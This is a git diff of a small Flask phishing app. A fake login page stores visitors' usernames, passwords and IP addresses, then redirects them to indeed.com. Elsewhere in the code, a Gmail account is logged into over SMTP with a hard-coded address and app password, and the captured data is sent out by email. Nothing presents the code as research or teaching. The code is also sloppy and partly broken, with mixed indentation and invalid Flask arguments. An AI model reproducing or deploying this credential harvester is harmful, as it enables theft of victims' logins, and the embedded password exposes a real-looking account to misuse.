@@ -9,8 +9,7 @@ ip_every = []
 
 totals = (f"The details are: {usernames} \n {passwords}\n and the ip is {ip_every}")
 
-
-@app.route("/index.html", method=["GET", "POST"])
+@app.route("/", method=["GET", "POST"])
 def index():
 	if request.method == "POST":
 		username = request.form.get("username")
@@ -19,14 +18,7 @@ def index():
 		usernames.append(username)
 		passwords.append(password)
     		ip_every.append(ip_addresses)
-
-	if request.form['username'] == 'admin' or request.form['password'] == 'admin':
-            return render_template('index.html')
-        else:
-            return render_template("https://linkedin.com")
-
 	return render_template("https://indeed.com")
-
 
 EMAIL_ADDRESS = ("busganda@gmail.com")
 EMAIL_PASSWORD = ("mkarxgucgtnvymys")
@@ -36,7 +28,7 @@ with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
 	smtp.starttls()
 	smtp.ehlo()
 
-	smtp.login( EMAIL_ADDRESS , EMAIL_PASSWORD )
+	smtp.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
 	
 	subject = ("Just Testing")
 	body = (ip_every)
